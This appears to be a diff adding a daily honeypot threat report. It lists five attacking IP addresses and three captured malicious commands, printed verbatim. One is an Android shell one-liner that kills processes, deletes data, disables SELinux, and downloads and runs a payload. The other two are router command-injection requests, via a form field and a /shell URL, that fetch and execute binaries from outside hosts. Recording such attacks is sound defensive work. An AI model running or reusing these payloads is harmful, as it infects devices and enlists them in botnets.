@@ -1,0 +1,19 @@
+Top 5 IPs for 2024-04-05 :
+
+175.206.212.132
+222.104.8.192
+121.141.39.140
+117.208.232.148
+124.57.131.180
+
+Malcious Commands seen:
+
+su 0 kill -9 $(toybox ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(surfaceflinger|system_server)/ && $2 > 15 && $1 != '$$' {print $1}');kill -9 $(toybox ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(surfaceflinger|system_server)/ && $2 > 15 && $1 != '$$' {print $1}');toybox pkill M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill M;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.67.197.152/and || su 0 busybox wget http://103.67.197.152/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;wget http://193.42.32.40/mpsl; chmod 777 mpsl; ./mpsl lblink.selfrep;
+
+
+/shell?cd+/tmp;+rm+-rf+shk;+wget+http:/\\/103.163.214.97/shk;+chmod+777+shk;+./shk+jaws;+rm+-rf+shk
